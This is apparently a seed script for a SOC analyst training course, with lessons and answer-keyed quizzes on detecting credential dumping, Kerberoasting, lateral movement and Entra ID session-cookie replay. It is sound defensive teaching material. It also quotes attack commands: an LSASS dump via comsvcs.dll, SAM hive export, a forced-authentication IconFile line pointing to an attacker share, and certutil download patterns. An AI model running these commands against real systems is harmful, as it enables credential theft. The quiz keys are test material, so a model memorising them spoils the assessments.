            {"value": "unlikely_travel", "label": "`unlikelyTravel` — impossible travel"},
            {"value": "anom_token", "label": "`anomalousToken` / `tokenIssuedFromAnonymousIP` — token-replay signals"},
            {"value": "ipconfig", "label": "`ipconfigDiscovery` — discovery command run from the host"},
        ],
        correct=["anon_ip", "malicious_ip", "unlikely_travel", "anom_token"],
        explanation_md="The trap is `ipconfigDiscovery` — that's an on-prem process-event pattern (T1016), not an Entra risk-event type. The other four are documented `risk_event_types_v2` values surfaced by Entra ID sign-in risk scoring. Recognising these on sight is the L2's daily reflex.",
        points=3,
    )
    _add_q(session, m4l1q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="Which Entra ID sign-in field is the *gold field* for AiTM session-cookie replay detection — same value reused from a new IP / UA / device within minutes signals cookie theft? (Field path.)",
        options=None,
        correct=["session_id", "azure.signinlogs.properties.session_id", "properties.session_id", "sessionId"],
        explanation_md="`azure.signinlogs.properties.session_id` (or simply `session_id`) — the same session ID re-used from a new IP/UA/device within minutes, with MFA `previouslySatisfied`, is the textbook AiTM cookie-replay fingerprint. Module 6 (L1) introduced this; the L2 hunt query targets it directly.",
        points=2,
    )
    _add_q(session, m4l1q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="A successful-logon event with EID 4624 and LogonType 3 (network) targeting an admin share like `\\\\HOST\\C$` from a non-DC workstation is a high-confidence indicator of SMB lateral movement (T1021.002).",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** LT3 to ADMIN$/C$/IPC$ from a non-DC workstation is the canonical SMB-lateral signature. Routine non-malicious LT3s in an estate are usually inter-server or backup-agent traffic; workstation-as-source against admin-share targets stands out cleanly.",
        points=2,
    )

    # Lesson 4.2 — Credential Access (TA0006)
    m4l2 = _add_lesson(
        session, mod4, order=3,
        title="Credential Access (TA0006) — top techniques and EQL fingerprints",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1003 OS Credential Dumping** — LSASS access (.001), SAM (.002), NTDS (.003), and **DCSync (.006)** via the EID 4662 replication GUID
> 2. Detect **T1110 Brute Force** — password guessing (.001), spray (.003), credential stuffing (.004) — by 4625 clusters
> 3. Hunt **T1558 Kerberos** — Kerberoasting (.003) via 4769 + RC4 downgrade, AS-REP Roasting (.004) via 4768 preauth-not-required, Golden / Silver Tickets
> 4. Recognise **T1539 Steal Web Session Cookie** (downstream from M6 phishing) and **T1187 Forced Authentication**
> 5. Detect **T1621 MFA Request Generation** push-bombing in Entra sign-in logs

## T1003 OS Credential Dumping

### .001 LSASS Memory

Mimikatz, `procdump -ma lsass.exe`, the **comsvcs.exe minidump trick** (`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full`), `nanodump`, `pypykatz`. The Sysmon EID 10 ProcessAccess fingerprint is the gold signal:

```eql
process where event.code == "10"
  and winlog.event_data.TargetImage : "?:\\\\Windows\\\\System32\\\\lsass.exe"
  and winlog.event_data.GrantedAccess : ("0x1010", "0x1410", "0x1438", "0x143a", "0x1F0FFF", "0x1FFFFF")
  and not winlog.event_data.SourceImage : ("?:\\\\Program Files\\\\Windows Defender\\\\*",
                                            "?:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\*",
                                            "?:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\*")
```

The `GrantedAccess` mask values are the access rights — `0x1010` is `PROCESS_VM_READ`+`PROCESS_QUERY_LIMITED_INFORMATION`, `0x1F0FFF` is `PROCESS_ALL_ACCESS`. The exclusion list catches the legitimate-EDR initiators that read LSASS routinely.

ES|QL pivoted view (count of LSASS reads per host per hour):

```esql
FROM winlogbeat-*
| WHERE @timestamp > NOW() - 24h
  AND event.code == "10"
  AND winlog.event_data.TargetImage LIKE "%lsass.exe"
  AND winlog.event_data.GrantedAccess IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1F0FFF", "0x1FFFFF")
| STATS access_count = COUNT(),
        sources = VALUES(winlog.event_data.SourceImage)
  BY host.name, BUCKET(@timestamp, 1h)
| SORT access_count DESC
```

### .002 SAM hive

`reg save HKLM\\SAM ...` or VSS shadow-copy extraction:

```eql
process where process.name : ("reg.exe", "regedit.exe")
  and process.command_line : ("*save*HKLM\\\\SAM*", "*save*HKLM\\\\SECURITY*", "*save*HKLM\\\\SYSTEM*")
```

### .003 NTDS

Domain-controller `ntds.dit` extraction via VSS or `ntdsutil ifm`. Hunt for `ntdsutil.exe` invocation and `vssadmin create shadow` chains targeting the `C:` volume on a DC:

```eql
process where (process.name : "ntdsutil.exe"
               and process.command_line : ("*ac i ntds*", "*ifm*"))
   or (process.name : "vssadmin.exe"
       and process.command_line : "*create shadow*"
       and host.os.platform : "windows"
       and host.role : "domain_controller")
```

### .006 DCSync — the EID 4662 replication-GUID hunt

The canonical signal: **EID 4662** with the AD replication GUID `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes) or `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) sourced from a *non-DC* host:

```eql
iam where event.code == "4662"
  and winlog.event_data.Properties : ("*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*",
                                       "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*",
                                       "*89e95b76-444d-4c62-991a-0facbeda640c*")
  and not source.ip : ("10.10.10.0/24")  // your DC subnet
```

Replace the `source.ip` exclusion with the actual DC subnet. A 4662 with the replication GUID from a *workstation* is *page-IR* — the operator is one step from Tier-0.

## T1110 Brute Force

### .001 Password Guessing — single account, many passwords

```esql
FROM winlogbeat-*
| WHERE @timestamp > NOW() - 1h AND event.code == "4625"
| STATS failure_count = COUNT() BY user.name, source.ip, BUCKET(@timestamp, 5m)
| WHERE failure_count > 10
| SORT failure_count DESC
```

### .003 Password Spraying — many accounts, few passwords

The inverted shape — many distinct usernames, low per-account failure count, all from one source:

```esql
FROM winlogbeat-*
| WHERE @timestamp > NOW() - 1h AND event.code == "4625"
| STATS user_count = COUNT_DISTINCT(user.name),
        failure_count = COUNT()
  BY source.ip, BUCKET(@timestamp, 10m)
| WHERE user_count > 20 AND failure_count > 30
| SORT user_count DESC
```

### .004 Credential Stuffing — leaked-creds reuse

Surfaces in Entra sign-in logs as *one success following many failures from the same source*:

```eql
sequence by source.ip with maxspan=10m
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.status.error_code != 0 ]
    until [ any where event.dataset == "azure.signinlogs"
                  and azure.signinlogs.properties.status.error_code == 0 ]
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.status.error_code == 0 ]
```

(The `until` halts the sequence on the *first* success — the hunt finds clusters of failures terminated by a success from the same source.)

## T1558 Kerberos Ticket Forging / Theft

### .003 Kerberoasting

Request TGS for SPN-bearing accounts, crack offline. **EID 4769** with `TicketEncryptionType: 0x17` (RC4-HMAC) when AES is policy is the signal:

```eql
iam where event.code == "4769"
  and winlog.event_data.TicketEncryptionType == "0x17"
  and not winlog.event_data.ServiceName : ("*$",  // exclude machine-account TGS
                                            "krbtgt")
```

ES|QL aggregation flagging high-volume TGS from one source:

```esql
FROM winlogbeat-*
| WHERE @timestamp > NOW() - 24h
  AND event.code == "4769"
  AND winlog.event_data.TicketEncryptionType == "0x17"
  AND NOT winlog.event_data.ServiceName LIKE "%$"
| STATS tgs_count = COUNT(),
        distinct_spns = COUNT_DISTINCT(winlog.event_data.ServiceName)
  BY winlog.event_data.IpAddress, user.name, BUCKET(@timestamp, 10m)
| WHERE tgs_count > 5 OR distinct_spns > 3
| SORT tgs_count DESC
```

### .004 AS-REP Roasting

Accounts with the *Do not require Kerberos preauth* flag set. **EID 4768** with `PreAuthType: "0"`:

```eql
iam where event.code == "4768"
  and winlog.event_data.PreAuthType == "0"
```

### .001 / .002 Golden / Silver Ticket

Forged TGTs (`krbtgt` hash) / TGSs (service-account hash). Detection is hard — the tickets are crypto-valid. Hunt on anomalies: a TGS with extremely long lifetime, a TGT issued with no preceding 4768, a sign-in with a stale or duplicate ticket nonce. Often surfaces only in retrospective hunts after lateral movement is detected via other paths.

## T1539 Steal Web Session Cookie — downstream from phishing

The Module 6 (L1) AiTM payoff. Detection is downstream:

- The *use* of the stolen cookie shows up as an Entra sign-in from a new device / IP with the same `session_id` as the legitimate sign-in moments earlier.
- Pair with `azure.signinlogs.properties.authentication_details` showing MFA `previouslySatisfied` for the second sign-in.

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 24h
| STATS sources = VALUES(azure.signinlogs.properties.ip_address),
        device_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.device_id),
        ua_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.browser),
        events = COUNT()
  BY azure.signinlogs.properties.user_principal_name,
     azure.signinlogs.properties.session_id,
     BUCKET(@timestamp, 30m)
| WHERE device_count > 1 OR ua_count > 1
| SORT events DESC
```

Same `session_id` + multiple devices / UAs / IPs in a 30-minute window is the AiTM session-replay fingerprint.

## T1187 Forced Authentication

The Module 6 OPSEC trap revisited from the L2 vantage. SMB UNC path or `.url` file with `IconFile=\\\\attacker\\share\\icon` causes the client to send the NTLM hash to attacker. Hunt outbound 445 to non-RFC1918:

```eql
network where destination.port == 445
  and host.os.family : "windows"
  and not cidrMatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
                                     "127.0.0.0/8", "fe80::/10")
```

## T1621 MFA Request Generation — push bombing

Many Entra sign-in attempts with MFA challenges in rapid succession from the same IP, pre-empting the user into approving:

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 1h
  AND azure.signinlogs.properties.authentication_requirement == "multiFactorAuthentication"
| STATS attempt_count = COUNT() BY azure.signinlogs.properties.user_principal_name,
                                    azure.signinlogs.properties.ip_address,
                                    BUCKET(@timestamp, 5m)
| WHERE attempt_count > 5
| SORT attempt_count DESC
```

Five MFA prompts in a 5-minute window from the same IP is suspicious; ten is push-bombing.

## Glossary

- **DCSync replication GUID** — `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes); a 4662 with this GUID from a non-DC source is *page-IR*.
- **TicketEncryptionType 0x17** — RC4-HMAC; the Kerberoasting downgrade signal when AES is the environment policy.
- **PreAuthType 0** — Kerberos preauth-not-required, the AS-REP Roasting flag.
- **GrantedAccess masks** (`0x1010`, `0x1F0FFF`) — Sysmon EID 10 access-rights values for LSASS reads.

## Further reading

- Microsoft Learn — *Audit Account Logon Events* and *Audit Directory Service Access*.
- ATT&CK — T1003 / T1110 / T1558 / T1187 / T1621 / T1539.
- Elastic Security prebuilt rules — Credential Access EQL/ES|QL rules.
""",
    )
    m4l2q = _add_lesson(
        session, mod4, order=4, title="Credential Access — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the DCSync replication GUID, password-spray vs guessing, Kerberoasting downgrade, and the AiTM session-replay shape.",
    )
    _add_q(session, m4l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees **EID 4662** on a domain controller with `winlog.event_data.Properties` containing the GUID `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}`, sourced from a workstation IP. What ATT&CK sub-technique does this most precisely fingerprint, and what is the correct L2 disposition?",
        options=[
            {"value": "lsass_monitor", "label": "T1003.001 LSASS Memory — open a low-severity case"},
            {"value": "dcsync_page", "label": "T1003.006 DCSync — *page-IR* signal; the operator is one step from Tier-0 control of the domain"},
            {"value": "tgs_request", "label": "T1558.003 Kerberoasting — wait for the second TGS"},
            {"value": "guess", "label": "T1110.001 password guessing — review for failure clusters"},
        ],
        correct="dcsync_page",
        explanation_md="The replication GUID `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` is `DS-Replication-Get-Changes` — abuse of the AD replication API to request password material for any account. From a *non-DC* source, this is the canonical T1003.006 DCSync fingerprint and a *page-IR* signal. The operator has cracked credentials with replication rights and is one step from Tier-0 control.",
        points=2,
    )
    _an2 = _add_q(session, m4l2q, order=2, kind=QuestionKind.SINGLE,
        stem_md="Which 4625-cluster shape best fingerprints **T1110.003 Password Spraying** (vs T1110.001 Password Guessing)?",
        options=[
            {"value": "guess", "label": "Many failures against *one* user from one source — `failure_count > 10` per `user.name` per 5min"},
            {"value": "spray", "label": "Many *distinct users* with low per-user failure count from one source — `COUNT_DISTINCT(user.name) > 20 AND COUNT() > 30` per `source.ip` per 10min"},
            {"value": "any", "label": "Any failure burst regardless of user-fan-out"},
            {"value": "single", "label": "A single 4625 event"},
        ],
        correct="spray",
        explanation_md="Password spraying inverts the brute-force shape — *many distinct users, few passwords each* (typically 1–3 attempts per user to evade lockout policy). The aggregation key is the **source IP**, with `COUNT_DISTINCT(user.name)` as the user-fan-out signal. Per-user failure clusters are guessing (T1110.001), not spraying.",
        points=2,
    )
    _add_q(session, m4l2q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *correct* fingerprints for **T1558 Kerberos ticket forging / theft** sub-techniques?",
        options=[
            {"value": "kerberoast", "label": "T1558.003 Kerberoasting: EID 4769 with `TicketEncryptionType: 0x17` (RC4-HMAC) when AES is policy + high-volume TGS from one source"},
            {"value": "asrep", "label": "T1558.004 AS-REP Roasting: EID 4768 with `PreAuthType: 0` (preauth-not-required)"},
            {"value": "golden", "label": "T1558.001 Golden Ticket: a 4624 successful logon at `LogonType: 2` from a console"},
            {"value": "silver", "label": "T1558.002 Silver Ticket is hard to detect deterministically — often surfaces only via post-hoc lateral-movement anomaly"},
        ],
        correct=["kerberoast", "asrep", "silver"],
        explanation_md="The trap is the Golden Ticket option — Golden Tickets are *forged TGTs* signed with the `krbtgt` hash; they bypass the entire 4768 issuance step, so an interactive 4624 is unrelated. Detection of Golden / Silver Tickets is genuinely hard (tickets are crypto-valid) and usually surfaces via anomalies in ticket lifetime, missing 4768 issuance, or replay nonces — covered in retrospective hunts.",
        points=3,
    )
    _add_q(session, m4l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="The Sysmon EID 10 ProcessAccess `GrantedAccess` mask values `0x1010` and `0x1F0FFF` against `lsass.exe` are reliable fingerprints of T1003.001 LSASS dumping — but modern attackers tune their requested access rights to evade these specific masks, so the L2's hunt should treat them as *common* signals (not definitive) and pair with behavioural / process-tree context.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** `0x1010` and `0x1F0FFF` (and adjacent values `0x1410` / `0x1438` / `0x143a` / `0x1FFFFF`) are the most common LSASS-dump GrantedAccess masks, but tools like `nanodump` request narrower access rights specifically to evade detection. The L2's hunt covers the common values and pairs with parent-process context (`procdump.exe`, `rundll32.exe comsvcs.dll`, browser-spawned tooling) for high-confidence triage.",
        points=2,
    )

    # Lesson 4.3 — Lateral Movement (TA0008)
    m4l3 = _add_lesson(
        session, mod4, order=5,
        title="Lateral Movement (TA0008) — top techniques and their fingerprints",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1021 Remote Services** — RDP (.001), SMB / Admin Shares (.002), DCOM (.003), SSH (.004), VNC (.005), WinRM (.006)
> 2. Detect **T1570 Lateral Tool Transfer** — `bitsadmin /transfer`, `certutil -urlcache -split -f`, `\\\\host\\C$\\Users\\Public\\` copies
> 3. Hunt **T1550 Use Alternate Authentication Material** — Pass-the-Hash (.002) and Pass-the-Ticket (.003)
> 4. Recognise **T1210 Exploitation of Remote Services** — EternalBlue, ProxyShell, ZeroLogon, PrintNightmare
> 5. Author multi-key EQL `sequence by host.name, user.name with maxspan` for lateral chains

## T1021 Remote Services

### .001 RDP

LogonType 10 + EID 4778/4779 reconnect events. Source from external IP or non-jumpbox workstation:

```eql
authentication where event.code == "4624"
  and winlog.event_data.LogonType == "10"
  and not winlog.event_data.IpAddress : ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
                                          "::1", "127.0.0.1", "-")
```

For lateral RDP from a workstation that isn't a jumpbox:

```eql
sequence by host.name with maxspan=2m
  [ authentication where event.code == "4624" and winlog.event_data.LogonType == "10" ]
  [ network where destination.port == 3389 and source.ip : "192.168.0.0/16" ]
```

### .002 SMB / Admin Shares

LT3 to ADMIN$ / C$ / IPC$:

```kql
event.code: "4624"
  and winlog.event_data.LogonType: "3"
  and (winlog.event_data.ShareName: ("\\\\\\\\*\\\\ADMIN$" or "\\\\\\\\*\\\\C$" or "\\\\\\\\*\\\\IPC$")
       or winlog.event_data.TargetUserName: ("Administrator" or "Admin*"))
  and not source.ip: ("10.10.10.0/24")  // exclude DC subnet, backup-server subnet
```

### .003 DCOM

`MMC20.Application.ExecuteShellCommand` / `ShellWindows` / `ShellBrowserWindow` abused for remote execution. Surfaces as `process.parent.name : "mmc.exe"` with `process.name : ("powershell.exe", "cmd.exe")` on the target host, paired with a 4624 LT3 from the source. EQL:

```eql
sequence by host.name with maxspan=1m
  [ authentication where event.code == "4624" and winlog.event_data.LogonType == "3" ]
  [ process where process.parent.name : ("mmc.exe", "explorer.exe")
              and process.name : ("powershell.exe", "cmd.exe", "wscript.exe") ]
```

### .004 SSH

`sshd` accepting password auth where keys are policy. Surfaces in `auth.log` (Linux Beats / Filebeat system module) with `event.action: "ssh_login"`:

```kql
event.dataset: ("system.auth" or "system.security")
  and event.action: "ssh_login"
  and event.outcome: "success"
  and not source.ip: ("10.0.0.0/8" or "172.16.0.0/12" or "192.168.0.0/16")
```

### .005 VNC

Port 5900 + attacker tooling. Less common in mature estates.

### .006 WinRM

Port 5985 (HTTP) / 5986 (HTTPS); `Enter-PSSession`, `Invoke-Command`. **EID 4624 with `LogonProcessName: "WinRM"`** is the giveaway:

```kql
event.code: "4624"
  and winlog.event_data.LogonType: "3"
  and winlog.event_data.LogonProcessName: "WinRM"
```

## T1570 Lateral Tool Transfer

Copying tooling between hosts after initial pivot. Common patterns:

```eql
process where (
  // BITS abuse
  (process.name : "bitsadmin.exe" and process.command_line : ("*/transfer*", "*/create*"))
  // certutil downloader
  or (process.name : "certutil.exe" and process.command_line : ("*-urlcache*", "*-split*", "*-f http*"))
  // PowerShell remote copy
  or (process.name : ("powershell.exe", "pwsh.exe")
      and process.command_line : ("*Invoke-WebRequest*", "*Net.WebClient*", "*Start-BitsTransfer*"))
  // SMB copy to admin share
  or (process.name : "cmd.exe" and process.command_line : "*copy*\\\\\\\\*\\\\C$\\\\*")
)
```

## T1550 Use Alternate Authentication Material

### .002 Pass-the-Hash

NTLM hash reused without plaintext password. Three telemetry surfaces:

- **EID 4624** NTLM with `LogonType: 9` (`NewCredentials`) from a non-DC source against an admin account.
- **EID 4624** `LogonType: 3` with `LogonProcessName: "NtLmSsp"` and `AuthenticationPackageName: "NTLM"` against an admin account from a non-DC.
- **EID 4776** NTLM credential validation with high failure rate (often paired with success).

```kql
event.code: "4624"
  and winlog.event_data.LogonType: ("3" or "9")
  and winlog.event_data.AuthenticationPackageName: "NTLM"
  and winlog.event_data.TargetUserName: ("Administrator" or "Admin*" or "*-adm")
  and not source.ip: ("10.10.10.0/24")  // exclude DC subnet
```

### .003 Pass-the-Ticket

Kerberos TGT/TGS reuse. Surfaces as 4768/4769 with anomalous source — a TGT issuance for an account that didn't 4624 from that source IP.

## T1210 Exploitation of Remote Services

EternalBlue (MS17-010), ProxyShell (Exchange CVE-2021-34473 chain), ZeroLogon (CVE-2020-1472), PrintNightmare (CVE-2021-34527). Detection is exploit-specific; the L2's reflex on a fresh CVE in the KEV catalogue is to:

1. Pull `network` events for the affected ports / protocols.
2. Pull `process` events for child processes of the vulnerable service (`spoolsv.exe`, `Exchange OWA app pool`, etc.).
3. Pull `file` events for new files on disk in the vulnerable service's directory.

ZeroLogon (CVE-2020-1472) example — abnormal Netlogon RPC traffic to a DC:

```kql
event.dataset: "system.security" and event.code: ("4742" or "4624")
  and winlog.event_data.LogonProcessName: "Netlogon"
  and winlog.event_data.PasswordLastSet: "2020*"  // reset after exploitation; use UTC bound
```

## Authoring multi-key EQL `sequence` for lateral chains

The L2's signature query shape. Two-step pattern joining the source-host event with the destination-host event by *both* host and user:

```eql
sequence by host.name, user.name with maxspan=10m
  [ process where process.name : ("powershell.exe", "pwsh.exe")
              and process.command_line : "*Invoke-Mimikatz*" ]
  [ authentication where event.code == "4624"
                     and winlog.event_data.LogonType == "3"
                     and not source.ip : ("10.10.10.0/24") ]
```

Multi-key `by` correlates the whole chain on the same host *and* user — which usually distinguishes a lateral pivot (same user, new host) from a reauthentication (same user, same host).

## Worked end-to-end — *Kerberoast → Lateral RDP* chain

```eql
sequence by host.name with maxspan=30m
  [ iam where event.code == "4769" and winlog.event_data.TicketEncryptionType == "0x17" ]
  [ authentication where event.code == "4624"
                     and winlog.event_data.LogonType == "10"
                     and not winlog.event_data.IpAddress : ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16") ]
```

Step 1 catches the Kerberoasting TGS request; step 2 catches a lateral RDP from a non-RFC1918 source within 30 minutes. The chain implies *credential cracked offline → RDP from attacker infrastructure*.

## Glossary

- **LogonType 9 + NTLM** — Pass-the-Hash classical fingerprint.
- **`LogonProcessName: "WinRM"`** — WinRM lateral fingerprint.
- **EID 4778 / 4779** — RDP reconnect / disconnect; pair with 4624 LT10.
- **DCOM lateral pattern** — `mmc.exe` parent of `cmd.exe` / `powershell.exe` after a 4624 LT3.
- **`bitsadmin /transfer` / `certutil -urlcache`** — T1570 lateral-tool-transfer tradecraft.

## Further reading

- ATT&CK — T1021 / T1570 / T1550 / T1210.
- Microsoft Learn — *Pass-the-Hash mitigations* and *Restrict NTLM*.
- Elastic Security prebuilt rules — Lateral Movement EQL rules.
""",
    )
    m4l3q = _add_lesson(
        session, mod4, order=6, title="Lateral Movement — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on PtH logon-type fingerprints, WinRM `LogonProcessName`, T1570 lateral-tool-transfer tradecraft, and multi-key EQL sequence keys.",
    )
    _add_q(session, m4l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which of the following is the most precise EID 4624 signature of **T1550.002 Pass-the-Hash** lateral movement?",
        options=[
            {"value": "lt2_ntlm", "label": "LogonType 2 (Interactive) with `AuthenticationPackageName: NTLM`"},
            {"value": "lt9_ntlm", "label": "LogonType 9 (NewCredentials) with `AuthenticationPackageName: NTLM` against an admin account from a non-DC source"},
            {"value": "lt10_kerb", "label": "LogonType 10 (RemoteInteractive) with `AuthenticationPackageName: Kerberos`"},
            {"value": "lt5_ntlm", "label": "LogonType 5 (Service) with NTLM"},
        ],
        correct="lt9_ntlm",
        explanation_md="LogonType 9 is `NewCredentials` (`runas /netonly`) — the classical Pass-the-Hash pattern: the attacker uses a stolen NTLM hash to authenticate to a remote resource without the plaintext password. Combined with `AuthenticationPackageName: NTLM` against an admin account from a non-DC source, it's the textbook PtH fingerprint. LT3 with NTLM is also a PtH variant but LT9 is the most specific.",
        points=2,
    )
    _add_q(session, m4l3q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for **T1021.006 WinRM** lateral movement and wants the most specific 4624 fingerprint (low FP). Which field-value combination should the hunt key on?",
        options=[
            {"value": "lt3_only", "label": "LogonType 3 only"},
            {"value": "winrm_proc", "label": "LogonType 3 with `LogonProcessName: \"WinRM\"` — distinguishes WinRM from generic SMB / RPC traffic that also produces LT3"},
            {"value": "port", "label": "Port 5985 / 5986 in network events only"},
            {"value": "psexec", "label": "Service installs (EID 7045) — that's PsExec, not WinRM"},
        ],
        correct="winrm_proc",
        explanation_md="`LogonProcessName: \"WinRM\"` on a 4624 LT3 is what distinguishes WinRM from generic SMB / RPC logon-type-3 traffic. The port (5985/5986) is a complementary signal but the LogonProcessName is the deterministic fingerprint. Service installs are PsExec (T1569.002 / T1021.002), not WinRM.",
        points=2,
    )
    _add_q(session, m4l3q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following process patterns are *typical* T1570 Lateral Tool Transfer fingerprints?",
        options=[
            {"value": "bitsadmin", "label": "`bitsadmin.exe /transfer ...` or `bitsadmin /create ...`"},
            {"value": "certutil", "label": "`certutil.exe -urlcache -split -f http://...`"},
            {"value": "iwr", "label": "`Invoke-WebRequest` or `Net.WebClient` from PowerShell"},
            {"value": "smb_admin", "label": "`copy ... \\\\\\\\HOST\\\\C$\\\\Users\\\\Public\\\\...` (cmd-side SMB copy to admin share)"},
            {"value": "ipconfig", "label": "`ipconfig /all` — discovery"},
        ],
        correct=["bitsadmin", "certutil", "iwr", "smb_admin"],
        explanation_md="`bitsadmin /transfer`, `certutil -urlcache -split -f`, PowerShell `Invoke-WebRequest` / `Net.WebClient`, and SMB copies to admin shares are all canonical T1570 lateral-tool-transfer patterns. `ipconfig /all` is a T1016 discovery command — different tactic family.",
        points=3,
    )
    _add_q(session, m4l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="An EQL `sequence by host.name, user.name with maxspan=10m` is more precise than `sequence by host.name with maxspan=10m` for lateral-movement chains because it correlates the chain on *both* host and user — distinguishing a lateral pivot (same user, new host) from incidental noise.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Multi-key `by host.name, user.name` keeps the user identity stable across the chain — a lateral pivot is the *same user appearing on a new host*, which is exactly what this correlation captures. Single-key `by host.name` correlates events on the destination but loses the per-user signal, producing false matches when multiple users transit a host.",
        points=2,
    )

    # Lesson 4.4 — Cloud-identity hunts + AiTM + capstone
    m4l4 = _add_lesson(
        session, mod4, order=7,
        title="Cloud-identity hunts (Entra/Azure AD), AiTM signals, and a worked end-to-end capstone",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Read **Entra ID sign-in log** fields (`azure.signinlogs.properties.*`) — `risk_level_during_sign_in`, `risk_event_types_v2`, `client_app_used`, `authentication_requirement`, `session_id`, `correlation_id`, `device_detail.*`, `location.*`
> 2. Author the **AiTM session-cookie reuse** detection — same `session_id` reused from new IP / UA / device within minutes, MFA `previouslySatisfied`
> 3. Hunt **Entra audit log** signals — `Add user`, `Add member to role`, `Consent to application`, `Add service principal`, mailbox-rule and inbox-forwarding patterns
> 4. Recognise **federation tampering** (T1556.006) — Domain Federation Settings, Golden SAML
> 5. Walk the **PEAK capstone** for *Kerberoasting → Lateral RDP → DCSync* end to end with a Kibana Security EQL detection-rule body

## Entra ID sign-in logs — the daily L2 surface

`logs-azure.signinlogs-*` carries every interactive and non-interactive sign-in. The fields the L2 reaches for daily are listed in Lesson 4.1; here we apply them to concrete hunts.

### High-risk sign-ins overview

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 24h
  AND azure.signinlogs.properties.risk_level_during_sign_in IN ("high", "medium")
| STATS event_count = COUNT(),
        risk_types = VALUES(azure.signinlogs.properties.risk_event_types_v2),
        ips = VALUES(azure.signinlogs.properties.ip_address),
        client_apps = VALUES(azure.signinlogs.properties.client_app_used)
  BY azure.signinlogs.properties.user_principal_name
| SORT event_count DESC
| LIMIT 100
```

### Legacy authentication — the silent gap

`client_app_used` values `IMAP4`, `POP3`, `Authenticated SMTP`, `Other clients` indicate **legacy authentication** — protocols that bypass MFA at the protocol level. Microsoft has deprecated basic auth for most but estate coverage is mixed.

```kql
event.dataset: "azure.signinlogs"
  and azure.signinlogs.properties.client_app_used: ("IMAP4" or "POP3" or "Authenticated SMTP" or "Other clients")
  and azure.signinlogs.properties.status.error_code: 0
```

A successful legacy-auth sign-in is *especially* suspicious for an MFA-enrolled user — it likely indicates a configuration gap an attacker has exploited.

## The AiTM session-cookie replay pattern — *the* L2 cloud-hunt

The textbook AiTM signal in Entra logs:

1. Successful interactive sign-in from the user's normal IP, MFA satisfied via Authenticator push.
2. Within minutes, a non-interactive sign-in for the *same `session_id`* from a different IP / country / UA, MFA `previouslySatisfied`.
3. Inbox rule creation in the Unified Audit Log (`logs-azure.auditlogs-*`).
4. New device or auth-method registration (T1098.005).

EQL `sequence` for steps 1–2:

```eql
sequence by azure.signinlogs.properties.user_principal_name,
            azure.signinlogs.properties.session_id
            with maxspan=15m
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.authentication_requirement == "multiFactorAuthentication"
          and azure.signinlogs.properties.authentication_details : "*satisfied*" ]
  [ any where event.dataset == "azure.signinlogs"
          and azure.signinlogs.properties.authentication_details : "*previouslySatisfied*" ]
```

Adding the IP-divergence check via ES|QL aggregation:

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 24h
| STATS sources = VALUES(azure.signinlogs.properties.ip_address),
        device_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.device_id),
        ua_count = COUNT_DISTINCT(azure.signinlogs.properties.device_detail.browser),
        events = COUNT()
  BY azure.signinlogs.properties.user_principal_name,
     azure.signinlogs.properties.session_id,
     BUCKET(@timestamp, 30m)
| WHERE device_count > 1 OR ua_count > 1
| SORT events DESC
| LIMIT 100
```

When `device_count > 1` or `ua_count > 1` for the same `(user, session_id)` in a 30-minute window, the cookie has likely been replayed from an attacker-controlled host.

## Entra audit-log signals — post-takeover tradecraft

`logs-azure.auditlogs-*` carries admin actions. The signals that follow a cloud takeover:

- **`New-InboxRule`** / **`Set-InboxRule`** — auto-forward, move-to-RSS-Feeds, delete-on-receipt with finance keywords.
- **`Add-MailboxPermission`** — granting Full Access / Send-As to another mailbox.
- **`Set-Mailbox -ForwardingSmtpAddress`** — mailbox-level forwarding to attacker.
- **`Update application` / `Add service principal credentials` / `Consent to application`** — OAuth backdoor establishment.
